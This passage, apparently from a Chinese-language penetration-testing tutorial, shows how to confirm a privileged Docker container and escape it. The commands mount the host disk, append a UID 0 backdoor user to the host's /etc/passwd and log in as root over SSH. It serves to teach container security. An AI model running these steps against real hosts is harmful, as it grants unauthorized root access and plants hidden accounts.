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" width="498" height="72" class="img_ev3q"></p>
<p>看到两个字段都为 0 清楚地表明这是一个特权容器。在非特权容器中，我们将分别看到 2 和 1。</p>
<p>最后，我们还可以进行一项检查，也许是最简单的一项检查，就是查看 /dev 目录中有多少文件。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ls /dev</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174932549-1667059740-8728eaaf7ed2e42db841e5b1cc942978.png" width="654" height="441" class="img_ev3q"></p>
<p>在 /dev 中看到大量文件和子目录，证明这是一个特权容器。在非特权容器中，我们不会在其中看到如此多的文件。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="43突破特权容器"><strong><div id="id4.3">4.3、突破特权容器</div></strong><a href="#43突破特权容器" class="hash-link" aria-label="43突破特权容器的直接链接" title="43突破特权容器的直接链接">​</a></h4>
<p>现在我们已经确定我们处于一个特权容器中，下一步就是突破它。</p>
<p><strong>与上一个示例类似，我们将挂载宿主机文件系统以突破容器。这次的不同之处在于我们需要从 docker 容器内部挂载它。</strong></p>
<p>首先，我们需要找到属于主机的驱动器，以便挂载它。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">df -h</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174927375-805382109-9f94acfd964872c108c4f5aeb9e99987.png" width="438" height="127" class="img_ev3q"></p>
<p>在这里，我们可以看到 sda5 是主机驱动器，这也是我们在前面的 fdisk 命令输出中看到的。</p>
<p>有了主机驱动器的名称，我们现在可以挂载它，然后从 Docker 内部访问主机上的所有文件。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mkdir -p /mnt/juggernaut</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mount /dev/sda5 /mnt/juggernaut</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ls -l /mnt/juggernaut</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174927682-981840167-ef6e82a0547d21c13338a5974c6fc5c8.png" width="582" height="493" class="img_ev3q"></p>
<p>Great！我们成功挂载了宿主机文件系统，现在我们可以 root 身份与其交互。</p>
<p>尽管我们拥有宿主机文件系统的 root 访问权限，但事实是我们仍然在容器中。所以现在我们需要突破容器以获得实际主机上的 root shell。</p>
<p>但与上次不同的是，我们无法复制 bash 并设置 SUID 位，因为我们在主机上没有立足点来执行它。</p>
<p>相反，我们需要做一些不同的事情来获取 root shell。</p>
<p>对于本例，我们要做的是创建一个 root 用户，然后使用它通过 SSH 连接到主机。</p>
<blockquote>
<p>注：此处必须要了解 docker 容器和宿主机之间的网络模式，本例容器的网络模式必须是 host 模式，也就是容器相当于一个应用部署在宿主机上，和宿主机使用共同的网卡、共同的 ip ，且假设宿主机已运行 ssh 服务。若容器使用其它的网络模式，则下列方法无效。</p>
</blockquote>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="431添加-root-用户"><strong><div id="id4.3.1">4.3.1、添加 “root” 用户</div></strong><a href="#431添加-root-用户" class="hash-link" aria-label="431添加-root-用户的直接链接" title="431添加-root-用户的直接链接">​</a></h6>
<p>由于宿主机文件系统挂载在容器中，因此通过编辑容器内部的 <strong>passwd</strong> 文件，更改也会发生在宿主机上。</p>
<p>首先，我们需要在攻击者计算机上为 root 用户生成密码哈希。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">openssl passwd -1 -salt r00t password123</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174927619-2122182463-da4b3475bad58a1d93e890c10fc31f90.png" width="372" height="61" class="img_ev3q"></p>
<p>获得哈希值后，我们可以获取此信息并将其输入以下命令，以将新行附加到 passwd 文件中，创建一个名为 r00t 的新 root 用户：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;r00t:$1$r00t$HZoYdo0F7UZbuKrEXMcah0:0:0:/dev/shm/pwnt:/bin/bash&#x27; &gt;&gt; /mnt/juggernaut/etc/passwd</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174927600-627756727-dc9b53d0658ff087e9f6522c128f65af.png" width="986" height="67" class="img_ev3q"></p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="432登录-root-用户"><strong><div id="id4.3.2">4.3.2、登录 “root” 用户</div></strong><a href="#432登录-root-用户" class="hash-link" aria-label="432登录-root-用户的直接链接" title="432登录-root-用户的直接链接">​</a></h6>
<p>Perfect！我们的 root 用户已经创建了。现在我们需要做的就是通过 SSH 连接到主机，我们就拥有了 root shell！</p>
<blockquote>
<p>因为我们将用户 id 和组 id 设置为0，所以这个新用户和内置的 root 是一样的。只要 UID 和 GID 为 0，所有 &quot;root&quot; 都是平等的。</p>
</blockquote>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ssh r00t@172.16.1.150</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174928534-45062389-fd8aa6f5bd23226bea229096f4029c0b.png" width="637" height="718" class="img_ev3q"></p>
<p>BOOM！就这样，我们无需先在宿主机上站稳脚跟，就能脱离 docker 容器！</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="5场景3直接在非特权容器中立足"><strong><div id="id5">5、场景3：直接在非特权容器中立足</div></strong><a href="#5场景3直接在非特权容器中立足" class="hash-link" aria-label="5场景3直接在非特权容器中立足的直接链接" title="5场景3直接在非特权容器中立足的直接链接">​</a></h2>
<p>正如我们在上一个例子中所看到的，我们从外部利用了同一台主机，并再次直接在 docker 容器中获得了立足点。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174927626-59151669-64e0f989a57a3edf48e99e8134b8d218.png" width="504" height="164" class="img_ev3q"></p>
<p>对于这个例子，假设我们已经升级到完整 TTY，并且我们还确认自己就是处于 docker 容器中。</p>
<p>接下来，我们需要检查这是否是一个特权容器。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="51确定这不是特权容器"><strong><div id="id5.1">5.1、确定这不是特权容器</div></strong><a href="#51确定这不是特权容器" class="hash-link" aria-label="51确定这不是特权容器的直接链接" title="51确定这不是特权容器的直接链接">​</a></h4>
<p>就像上一个例子一样，我们首先检查是否可以使用 <strong>fdisk</strong> 命令。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">fdisk -l | grep -A 10 -i &quot;device&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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